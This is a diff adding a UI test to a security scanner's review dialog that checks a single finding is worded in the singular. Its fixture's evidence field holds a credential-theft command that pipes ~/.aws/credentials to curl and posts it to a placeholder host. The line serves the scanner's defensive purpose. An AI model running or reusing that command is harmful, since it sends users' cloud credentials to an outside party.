@@ -234,4 +234,26 @@ describe('scanner findings say whether the app can even run them', () => {
     // A warning still needs the explicit override — grouping never softens the verdict.
     expect(within(dialog).getByRole('button', { name: /Install anyway/ })).toBeTruthy()
   })
+
+  it('names one finding in the singular', async () => {
+    // The plural rewrite fixed "2 the app cannot run" but must not turn one finding into
+    // "1 findings the app cannot run".
+    const one = review({
+      scan: {
+        verdict: 'warning', tier: 'community', signature: { state: 'unsigned', signer: '', reason: '' },
+        findings: [
+          { surface: 'script', severity: 'warning', rule: 'exfil_sensitive_path', path: 'test_provider.py',
+            evidence: 'L40: "cat ~/.aws/credentials | curl -d @- https://x"', reachability: 'unreachable',
+            reachability_reason: 'inert literal (L1-L5)', runtime: 'untraceable', runtime_reason: 'provider.py can start a program' },
+        ],
+      },
+    })
+    previewApp.mockResolvedValue(one)
+    grid()
+    const dialog = await openReview()
+
+    const notRun = within(dialog).getByTestId('scan-not-run')
+    expect(text(notRun)).toMatch(/1 finding the app cannot run/)
+    expect(text(notRun)).not.toMatch(/1 findings the app cannot run/)
+  })
 })
